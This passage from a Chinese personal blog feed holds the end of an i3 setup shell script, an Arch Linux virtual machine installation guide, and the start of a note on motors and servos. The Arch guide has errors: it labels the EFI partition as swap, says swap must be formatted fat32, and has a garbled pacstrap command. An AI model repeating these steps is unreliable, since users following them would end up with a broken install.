;;<br>            p) select_polybar_themes    ;;<br>            r) select_rofi_themes       ;;<br>            s) select_xresources_themes ;;<br>            t) select_terminal          ;;<br>            x) config_resolution        ;;<br>            y) install_xinit            ;;<br>            z) auto_install_all         ;;<br>            u) update_i3config          ;;<br>            h) usage_shortcuts          ;;<br>            q|<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-built_in">return</span> 0              ;;  <span class="hljs-comment"># 返回上级菜单</span><br>            *) redr_line <span class="hljs-string">&quot;没这个选择[<span class="hljs-variable">$str_answer</span>],搞错了再来.&quot;</span> ;;<br>        <span class="hljs-keyword">esac</span><br>    <span class="hljs-keyword">done</span><br>&#125;<br><br><br><span class="hljs-comment">####### Main process #################################</span><br>menu_head <span class="hljs-string">&quot;<span class="hljs-variable">$WELCOME</span>&quot;</span><br>check_term      <span class="hljs-comment"># 检测TERM终端信息</span><br>check_basic     <span class="hljs-comment"># 基础依赖命令检测与安装</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$#</span>&quot;</span> -eq 0 ]; <span class="hljs-keyword">then</span>  <span class="hljs-comment"># 无参数情况:进入菜单选择</span><br>    start_main<br><span class="hljs-keyword">else</span>  <span class="hljs-comment"># 命令执行模式(执行后退出)</span><br>    <span class="hljs-built_in">command</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$command</span>&quot;</span> <span class="hljs-keyword">in</span><br>        h|<span class="hljs-built_in">help</span>|-h)<br>            usage_shortcuts ;;<br>        i3)<br>            install_i3wm ;;<br>        polybar)<br>            compile_polybar ;;<br>        polybar_themes)<br>            install_polybar_themes ;;<br>    <span class="hljs-keyword">esac</span><br><span class="hljs-keyword">fi</span><br><br>menu_head <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;SEE_YOU&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/642302828">https://zhuanlan.zhihu.com/p/642302828</a></p><p><a href="https://www.cnblogs.com/shadow-/p/17572589.html">https://www.cnblogs.com/shadow-/p/17572589.html</a></p><p><a href="https://github.com/Airblader/i3?tab=readme-ov-file">一些i3的配置</a></p><p><a href="https://github.com/ysc2/dotfile">一些i3的配置</a></p><p><a href="https://www.cnblogs.com/shadow-/p/17572589.html">关于i3的消息</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机安装Arch-Linux记录</title>
    <link href="/2024/03/01/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85Arch-Linux%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/03/01/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85Arch-Linux%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>虚拟机安装Arch-Linux记录</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先，按照<code>arch</code>非常奇怪。它是先在计算机上跑上Linux内核，然后进行文件系统的配置，挂载。制作一个新的root用户。使用命令行工具下载号arch-Linux的内核、vim、等等常用工具至新root用户的文件夹下。再转到这个root用户上。</p><h1 id="虚拟机设置"><a href="#虚拟机设置" class="headerlink" title="虚拟机设置"></a>虚拟机设置</h1><p>在虚拟机（VMware）上安装arch，首先应该在虚拟机设置中将<code>BIOS</code>转换为<code>UEFI</code>：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403011559764.png"></p><p>虚拟机注意默认的内存大小可能太小了，会导致无法进入系统。我们将其调高即可。</p><h1 id="网络配置以及时间配置"><a href="#网络配置以及时间配置" class="headerlink" title="网络配置以及时间配置"></a>网络配置以及时间配置</h1><ol><li>禁用 reflector 服务</li></ol><p>2020 年，archlinux 安装镜像中加入了 reflector 服务，它会自己更新 mirrorlist（软件包管理器 pacman 的软件源）。在特定情况下，它会误删某些有用的源信息。这里进入安装环境后的第一件事就是将其禁用。也许它是一个好用的工具，但是很明显，因为地理上造成的特殊网络环境，这项服务并不适合启用。</p><p>通过以下命令将该服务禁用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">systemctl stop reflector.service<br></code></pre></td></tr></table></figure><p>通过以下命令查看该服务是否被禁用，按下 q 退出结果输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">systemctl status reflector.service<br></code></pre></td></tr></table></figure><p>如果输出下列内容在表示已经关闭了该服务。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403011603951.png"></p><ol start="2"><li>再次确保是否为<code>UEFI</code>模式</li></ol><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">ls /sys/firmware/efi/efivars<br></code></pre></td></tr></table></figure><p>如果你没有在虚拟机中将<code>BOIS</code>改成<code>UEFI</code>则，在<code>/sys/firmware/</code>下是没有<code>/efi/</code>文件夹的。当系统输出一下内容时，则为<code>UEFI</code>模式。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403011607433.png"></p><ol start="3"><li>连接网络</li></ol><p>实际上，在虚拟机中安装<code>Arch</code>时，只要主机有网络，并且虚拟机配置正确则<strong>不需要执行此步</strong>。</p><ul><li><p>如果使用无线连接</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs zsh">iwctl # 进入交互式命令行<br>device list # 列出无线网卡设备名，比如无线网卡看到叫 wlan0<br>station wlan0 scan # 扫描网络<br>station wlan0 get-networks # 列出所有 wifi 网络<br>station wlan0 connect wifi-name # 进行连接，注意这里无法输入中文。回车后输入密码即可<br>exit # 连接成功后退出<br></code></pre></td></tr></table></figure></li><li><p>如果使用有线连接</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">正常来说，只要插上一个已经联网的路由器分出的网线（DHCP），直接就能联网。<br><br>可以等待几秒等网络建立连接后再进行下一步测试网络的操作。<br><br>若笔记本没有网线接口请使用带网线接口的扩展坞。<br><br>在打开系统之后则需要进行系统分区，<br></code></pre></td></tr></table></figure></li></ul><ol start="4"><li>测试网络是否通畅</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">ping www.baidu.com<br></code></pre></td></tr></table></figure><ol start="5"><li>更新系统时间</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">timedatectl set-ntp true # 将系统时间与网络时间进行同步<br>timedatectl status # 检查服务状态<br></code></pre></td></tr></table></figure><p>当系统出现一下情况时，完成操作。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403011613006.png"></p><ol start="6"><li>更换国内软件仓库镜像源加快下载速度</li></ol><p>打开文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">vim /etc/pacman.d/mirrorlist<br></code></pre></td></tr></table></figure><p>放在最上面的是会使用的软件仓库镜像源，推荐的镜像源如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs zsh">Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch # 中国科学技术大学开源镜像站<br>Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch # 清华大学开源软件镜像站<br>Server = https://repo.huaweicloud.com/archlinux/$repo/os/$arch # 华为开源镜像站<br>Server = http://mirror.lzu.edu.cn/archlinux/$repo/os/$arch # 兰州大学开源镜像站<br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403011615578.png"></p><h1 id="系统分区"><a href="#系统分区" class="headerlink" title="系统分区"></a>系统分区</h1><p>完成了上述操作后，进入了非常重要的系统分区阶段。</p><p><code>Arch</code>要求我们将硬盘分为四个区域：</p><table><thead><tr><th>挂载点</th><th>分区</th><th>分区类型</th><th>建议大小</th></tr></thead><tbody><tr><td>&#x2F;mnt&#x2F;efi</td><td>efi_system_partition(&#x2F;dev&#x2F;sdax)</td><td>Swap</td><td>至少 300 MiB。如果您打算安装多个内核，那就是至少 1 GiB。</td></tr><tr><td>&#x2F;mnt</td><td>&#x2F;dev&#x2F;root_partition(&#x2F;dev&#x2F;sdax)</td><td>Linux x86-64 根目录 (&#x2F;)</td><td>小于home空间的大小，具体的按照总硬盘大小分配</td></tr><tr><td>&#x2F;mnt&#x2F;home</td><td>home_partition</td><td>home</td><td>最大的区域</td></tr><tr><td>[SWAP]</td><td>&#x2F;dev&#x2F;swap_partition</td><td>Linux swap (交换空间)</td><td>大于 512 MiB。或者根据您的计算机的内存大小来决定。</td></tr></tbody></table><p>我的分区示例：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/%E6%89%B9%E6%B3%A8%202024-03-01%20162727.png"></p><p>下面通过命令行来完成上述操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs zsh"># 图形化分区示例<br>cfdisk /dev/sda<br># 分区示例<br>Device        Start      End  Sectors  Size Type<br>/dev/sda1      2048   845823   843776  412M EFI System<br>/dev/sda2    845824 42788863 41943040   20G Linux root (x86-64)<br>/dev/sda3  42788864 63760383 20971520   10G Linux home<br>/dev/sda4  63760384 72148991  8388608    4G Linux swap<br># 初始化swap分区<br>mkswap /dev/sda4<br># 使用swap分区<br>swapon /dev/sda4<br># 格式化efi分区<br>mkfs.fat -F 32 /dev/sda1<br># 格式化其他分区，使用ext4格式<br>mkfs.ext4 -F /dev/sda2<br>mkfs.ext4 -F /dev/sda3<br># 挂载分区<br>mount --mkdir /dev/sda2 /mnt<br>mount --mkdir /dev/sda1 /mnt/efi<br>mount --mkdir /dev/sda3 /mnt/home<br># 上面这里，如果没有使用--mkdir选项的话。报错：<br># mount point does not exist 说没有挂载点。<br># 查看挂载情况，还可以使用命令lsblk<br>df<br></code></pre></td></tr></table></figure><p>{ % note warning % }</p><ul><li>格式化<code>home</code>分区和<code>root</code>分区时，不可以将其格式化为<code>fat</code>文件系统。</li><li>格式化<code>Swap</code>分区时，必须将其格式化为<code>fat32</code>的文件系统。<br>{ % endnote % }</li></ul><p>{ % note info% }<br>lsblk是一个用于列出块设备信息的Linux命令。<br>常用选项：</p><p>-a或–all：显示所有的设备，包括未挂载的设备。<br>-f或–fs：同时显示文件系统的信息。<br>-m或–ascii：使用ASCII字符显示块大小。<br>-p或–pairs：以键值对的形式显示信息。<br>-o或–output：自定义输出列表。<br>-h或–help：显示帮助信息。<br>{ % endnote % }</p><p>{ % note info%}<br>挂载命令和卸载命令：<br>mount<br>-a：挂载 &#x2F;etc&#x2F;fstab 文件中列出的所有文件系统。<br>-fstype：指定文件系统的类型，例如 ext4, btrfs, ntfs 等。<br>-o：用于指定挂载选项，如 rw（读写模式），ro（只读模式），noexec（禁止执行二进制文件），nosuid（忽略所有SUID&#x2F;SGID设置）等。可以多次使用 -o 来指定多个选项。<br>-L：通过标签名挂载文件系统。<br>-U：通过UUID挂载文件系统。<br>-l：显示文件系统的状态，而不是实际挂载它。<br>-n：以“无操作”模式运行，不实际挂载文件系统，但会显示将要执行的操作。</p><p>umonut<br>-l &#x2F;home 强制卸载<br>-n：卸载网络文件系统。<br>-O：卸载指定类型的文件系统，例如 -O tmpfs。<br>-i：卸载时忽略非关键错误。</p><p>{ % endnote%}</p><h2 id="如何更换文件系统"><a href="#如何更换文件系统" class="headerlink" title="如何更换文件系统"></a>如何更换文件系统</h2><p>如果你想要更换一个新的文件系统，那么你需要先将该分区卸载下来<code>umount</code>，然后使用命令<code>mkfs.ext4(fs_name)</code>来格式化一个新的文件系统。</p><p>如果取消挂载时出现了：umount取消挂载时提示&#x2F;home: device is busy问题。则</p><h1 id="安装系统以及必须软件"><a href="#安装系统以及必须软件" class="headerlink" title="安装系统以及必须软件"></a>安装系统以及必须软件</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs zsh">pacstrap -K /mnt baseKKase-devel linux vim dhcpcd net-tools<br><br>这是为/mnt下安装一些环境用于待会创建用户所使用的，包括一些基本环境以及网络相关的dhcpcd和net-tools<br><br>pacstrap /mnt base base-devel linux linux-firmware btrfs-progs<br># 如果使用btrfs文件系统，额外安装一个btrfs-progs包<br><br>pacstrap /mnt networkmanager vim sudo zsh zsh-completions<br></code></pre></td></tr></table></figure><h1 id="生成-fstab-文件"><a href="#生成-fstab-文件" class="headerlink" title="生成 fstab 文件"></a>生成 fstab 文件</h1><p>fstab 用来定义磁盘分区。它是 Linux 系统中重要的文件之一。使用 genfstab 自动根据当前挂载情况生成并写入 fstab 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">genfstab -U /mnt &gt; /mnt/etc/fstab<br></code></pre></td></tr></table></figure><p>复查一下 &#x2F;mnt&#x2F;etc&#x2F;fstab 确保没有错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">cat /mnt/etc/fstab<br></code></pre></td></tr></table></figure><h1 id="切换至新系统"><a href="#切换至新系统" class="headerlink" title="切换至新系统"></a>切换至新系统</h1><p>使用命令<code>arch-chroot</code>切换至新系统，**注意是<code>arch-chroot</code>而不是<code>chroot</code>。</p><p>此时，原来安装盘下的 &#x2F;mnt 目录就变成了新系统的 &#x2F; 目录。同时，可以发现命令行的提示符颜色和样式也发生了改变。</p><p>如果在原来的安装环境下直接使用<code>pacman</code>安装大量软件包，则可能会报错：<code>arch linux failed to commit transaction (invalid or corrupted package)</code></p><p>此时，我们切换至新系统再来安装即可。</p><h1 id="配置新系统中的环境"><a href="#配置新系统中的环境" class="headerlink" title="配置新系统中的环境"></a>配置新系统中的环境</h1><ol><li>设置好主机名<br> <code>vim /etc/hostname</code>在里面加入自己的主机名，如<code>ysc</code>。</li><li>在<code>/etc/hosts/</code>配置：<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1   localhost<br>::1         localhost<br>127.0.1.1   myarch.localdomain myarch<br></code></pre></td></tr></table></figure></li><li>随后设置时区，在 &#x2F;etc&#x2F;localtime 下用 &#x2F;usr 中合适的时区创建符号链接：<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br></code></pre></td></tr></table></figure></li><li>使用如下命令将系统时间同步到硬件时间：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">hwclock --systohc<br></code></pre></td></tr></table></figure></li><li>设置 Locale<br>编辑 &#x2F;etc&#x2F;locale.gen，去掉 en_US.UTF-8 UTF-8 以及 zh_CN.UTF-8 UTF-8 行前的注释符号（#）：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">vim /etc/locale.gen<br></code></pre></td></tr></table></figure></li><li>然后使用如下命令生成 locale：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">locale-gen<br></code></pre></td></tr></table></figure></li><li>向 &#x2F;etc&#x2F;locale.conf 输入内容：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">echo &#x27;LANG=en_US.UTF-8&#x27;  &gt; /etc/locale.conf<br></code></pre></td></tr></table></figure><strong>不推荐在此设置任何中文 locale，会导致 tty 乱码。</strong></li><li>为<code>root</code>用户设置好密码：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">passwd <br></code></pre></td></tr></table></figure></li><li>添加一个非<code>root</code>用户<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">useradd -m -G wheel -s /bin/bash ysc<br></code></pre></td></tr></table></figure><blockquote><p>参数注解：<br>   -m：在home文件下加创建一个用户文件夹。<br>   -G 添加 wheel组，此处将用户加到wheel组中，之后可以给这个组执行sudo命令的权限<br>   -s 设置好默认登陆shell</p></blockquote> 为了让我们的普通用户也能使用sudo权限，需要给wheel中的用户赋予权限,</li></ol><p>使用上面命令打开sudoers文件后，删除wheel组前面的注释（#）即可：<br>    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zsh">visudo，直接使用这个命令打开文件/etc/sudoers<br>或者是：<br>vim /etc/sudoers<br></code></pre></td></tr></table></figure><br>    将wheel前面的注释去掉：<br>    <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403011723307.png"></p><ol start="10"><li>重要的一点，在刚进入新系统的时候是没有网络的。ping不通，此时需要：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">sudo systemctl enable NetworkManager<br>sudo systemctl start NetworkManager<br></code></pre></td></tr></table></figure></li></ol><h1 id="制作好Grub引导"><a href="#制作好Grub引导" class="headerlink" title="制作好Grub引导"></a>制作好Grub引导</h1><p>如果没有制作引导的话，一切都是白费的。因为系统在下一次启动的时候还会进入安装环境，而不是新环境。</p><p>grub是一个启动引导器，同时支持EFI和BIOS方式的启动。若使用的UEFI方式引导系统，则还需要安装efibootmgr，如果是双系统的话，还需要安装os-prober，且如果使用Intel CPU的话，则需要安装 intel-ucode 并启用因特尔微码更新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs zsh"># 安装grub和efibootmgr<br>pacman -S grub efibootmgr<br># 部署efi引导<br>grub-install --target=x86_64-efi --efi-directory=/efi --bootloader-id=GRUB<br># 生成grub配置文件<br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure><h2 id="安装微码"><a href="#安装微码" class="headerlink" title="安装微码"></a>安装微码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">pacman -S intel-ucode   #Intel<br>pacman -S amd-ucode     #AMD<br></code></pre></td></tr></table></figure><h1 id="中文本地化"><a href="#中文本地化" class="headerlink" title="中文本地化"></a>中文本地化</h1><p>要正确显示中文，必需设置正确的 locale 并安装合适的中文字体。</p><h2 id="locale-设置"><a href="#locale-设置" class="headerlink" title="locale 设置"></a>locale 设置</h2><h3 id="安装中文-locale"><a href="#安装中文-locale" class="headerlink" title="安装中文 locale"></a>安装中文 locale</h3><p>Linux 中通过 locale 来设置程序运行的本地化环境。根据地区和字符编码的不同，常用的中文 locale 有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs zsh">zh_CN.GB18030<br>zh_CN.UTF-8<br>zh_HK.UTF-8<br>zh_SG.UTF-8<br>zh_TW.BIG-5<br>zh_TW.UTF-8<br></code></pre></td></tr></table></figure><p>推荐使用 UTF-8 的 locale 而非老旧的各地区编码。需要修改 &#x2F;etc&#x2F;locale.gen 文件来设定系统中可以使用的 locale（取消对应项前的注释符号“#”即可）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zsh">en_US.UTF-8 UTF-8<br>zh_CN.UTF-8 UTF-8<br>zh_SG.UTF-8 UTF-8<br></code></pre></td></tr></table></figure><p>然后执行 locale-gen 命令，便可以在系统中使用这些 locale。可以通过 locale 命令来查看当前使用的 locale：亦可通过 locale -a 命令来查看目前可以使用的 locale。</p><h2 id="配置中文-locale"><a href="#配置中文-locale" class="headerlink" title="配置中文 locale"></a>配置中文 locale</h2><p><strong>首先设置一个英文的全局 locale。这并不是必须的，只是为了防止 TTY 中出现豆腐块（见下方注意）：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">$ cat /etc/locale.conf<br>LANG=en_US.UTF-8<br></code></pre></td></tr></table></figure><p>LANG 这个环境变量代表默认的区域设置，具体的含义见 Locale#LANG：默认的区域设置</p><div class="note note-warning">            <p>注意： 不推荐在 &#x2F;etc&#x2F;locale.conf 里把全局的 LANG locale 设置成中文 LANG&#x3D;zh_CN.UTF-8，因为 TTY 下没有 CJK 字体，这样设置会导致 TTY 中显示豆腐块（除非你使用的内核打了 cjktty 补丁能绘制中文字体，比如linux-lilyCNRepo）。</p>          </div><div class="note note-info">            <p>每个用户单独的 locale 可以在 <del>&#x2F;.bashrc、</del>&#x2F;.xinitrc 或 ~&#x2F;.xprofile 中设置：</p><p><code>.bashrc</code>：每次使用终端时会应用此处的设置。<br><code>.xinitrc</code>：每次使用 startx 或 SLiM 来启动 X 窗口系统时会应用此处的设置。<br><code>.xprofile</code>：每次使用 GDM 等显示管理器时会应用此处的设置。<br>为图形界面配置中文 locale<br>不推荐 <code>/etc/locale.conf</code> 使用全局中文 locale，会导致 TTY 中显示出豆腐块。</p>          </div><p>如前所述，建议在 <code>~/.xinitrc</code> 或 <code>~/.xprofile</code> 里单独设置中文 locale，即添加下面两行到文件的最开头（如果不确定使用哪个文件，都添加）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">export LANG=zh_CN.UTF-8<br>export LANGUAGE=zh_CN:en_US<br></code></pre></td></tr></table></figure><h1 id="重启系统"><a href="#重启系统" class="headerlink" title="重启系统"></a>重启系统</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zsh">exit<br>umount -R /mnt<br>reboot<br></code></pre></td></tr></table></figure><p>重启后可使用刚才添加的用户和密码进行登录。</p><p><strong>安装完进入系统以后以后可能会出现网络无法访问的情况，即当ping百度出现下面错误</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">ping: www.baidu.com: Temporary failure in name resolution<br></code></pre></td></tr></table></figure><p>解决办法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">vim /etc/resolv.conf <br></code></pre></td></tr></table></figure><p>在里面添加<code>nameserver 8.8.8.8</code></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://wiki.archlinuxcn.org/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97">官方中文wiki</a></p><p><a href="https://arch.icekylin.online/guide/rookie/basic-install.html#_0-%E8%BF%9B%E5%85%A5%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83">arch Linux安装教程</a></p><p><a href="https://freeflyingsheep.github.io/posts/linux/arch/">https://freeflyingsheep.github.io/posts/linux/arch/</a></p><p><a href="https://arch.icekylin.online/guide/rookie/basic-install.html">https://arch.icekylin.online/guide/rookie/basic-install.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/611366782">https://zhuanlan.zhihu.com/p/611366782</a></p><p><a href="https://blog.csdn.net/takashi77/article/details/118927109">https://blog.csdn.net/takashi77/article/details/118927109</a></p><p><a href="https://blog.csdn.net/songpeiying/article/details/135013651">lsblk</a></p><p><a href="https://blog.csdn.net/m0_57459724/article/details/121706567">https://blog.csdn.net/m0_57459724/article/details/121706567</a></p><p><a href="https://wiki.archlinuxcn.org/wiki/%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%E6%9C%AC%E5%9C%B0%E5%8C%96">简体中文本地化</a></p>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>电机与舵机</title>
    <link href="/2024/02/29/%E7%94%B5%E6%9C%BA%E4%B8%8E%E8%88%B5%E6%9C%BA/"/>
    <url>/2024/02/29/%E7%94%B5%E6%9C%BA%E4%B8%8E%E8%88%B5%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>记录电机的相关知识点</p><span id="more"></span><p>电机与舵机</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402060312947.png"></p><h1 id="电机的基本概念"><a href="#电机的基本概念" class="headerlink" title="电机的基本概念"></a>电机的基本概念</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402290242472.png"></p><p>其中异步电机和同步电机的主要区别就是：转子是否以等同于旋转磁场的速度、方向旋转。</p><h1 id="电机是什么？"><a href="#电机是什么？" class="headerlink" title="电机是什么？"></a>电机是什么？</h1><ol><li>按工作电源种类划分：可分为直流电机和交流电机。<ul><li>直流电动机按结构及工作原理可划分：无刷直流电动机和有刷直流电动机。<br>有刷直流电动机可划分：永磁直流电动机和电磁直流电动机。</li></ul></li></ol><p>电磁直流电动机划分：串励直流电动机、并励直流电动机、他励直流电动机和复励直流电动机。</p><p>永磁直流电动机划分：稀土永磁直流电动机、铁氧体永磁直流电动机和铝镍钴永磁直流电动机。</p><ul><li>其中交流电机还可划分：单相电机和三相电机。<img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402060325998.png"></li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402060312518.png"></p><ol><li>按用途可划分：驱动用电动机和控制用电动机。<ul><li>驱动用电动机可划分：电动工具（包括钻孔、抛光、磨光、开槽、切割、扩孔等工具）用电动机、家电（包括洗衣机、电风扇、电冰箱、空调器、录音机、录像机、影碟机、吸尘器、照相机、电吹风、电动剃须刀等）用电动机及其他通用小型机械设备（包括各种小型机床、小型机械、医疗器械、电子仪器等）用电动机。</li><li>控制用电动机又划分：<strong>步进电动机和伺服电动机</strong>等。</li></ul></li></ol><h1 id="舵机是什么？"><a href="#舵机是什么？" class="headerlink" title="舵机是什么？"></a>舵机是什么？</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402060313505.png"></p><p><strong>舵机其实就是伺服电机，因为国内的用户已开始使用在航模等设备的舵轴控制，所以国内对这些轻量级的伺服电机称之为舵机。</strong></p><h2 id="什么是伺服电机"><a href="#什么是伺服电机" class="headerlink" title="什么是伺服电机"></a>什么是伺服电机</h2><p>伺服电机（servo motor ）是指在伺服系统中控制机械元件运转的发动机，是一种补助马达间接变速装置。<br>伺服电机可使控制速度，位置精度非常准确，可以将电压信号转化为转矩和转速以驱动控制对象。伺服电机转子转速受输入信号控制，并能快速反应，在自动控制系统中，用作执行元件，且具有机电时间常数小、线性度高等特性，可把所收到的电信号转换成电动机轴上的角位移或角速度输出。分为直流和交流伺服电动机两大类，其主要特点是，当信号电压为零时无自转现象，转速随着转矩的增加而匀速下降。</p><h2 id="伺服电机的工作原理"><a href="#伺服电机的工作原理" class="headerlink" title="伺服电机的工作原理"></a>伺服电机的工作原理</h2><ol><li><p>伺服系统（servo 